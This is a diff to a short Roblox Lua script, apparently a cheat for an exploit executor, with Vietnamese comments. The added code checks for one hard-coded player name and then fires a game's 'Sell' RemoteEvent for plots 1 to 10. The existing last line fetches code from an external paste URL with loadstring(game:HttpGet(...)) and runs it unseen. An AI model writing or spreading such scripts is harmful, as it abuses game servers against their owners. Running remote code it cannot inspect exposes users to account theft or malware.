@@ -1,1 +1,32 @@
+-- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Player
+local player = Players.LocalPlayer
+
+-- Kiểm tra username
+if player.Name ~= "Me_hellooo9" then
+    return -- Không đúng tên thì dừng script
+end
+
+-- Remote
+local sellRemote = ReplicatedStorage
+    :WaitForChild("Packages")
+    :WaitForChild("Net")
+    :FindFirstChild("RE/PlotService/Sell")
+
+if not sellRemote then
+    warn("Không tìm thấy Remote Sell")
+    return
+end
+
+-- Fire từ 1 -> 10
+for i = 1, 10 do
+    local args = {
+        [1] = i
+    }
+    sellRemote:FireServer(unpack(args))
+    task.wait(0.1) -- tránh spam quá nhanh (có thể bỏ)
+end
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/EMprNzDhszoM79hc/raw"))()
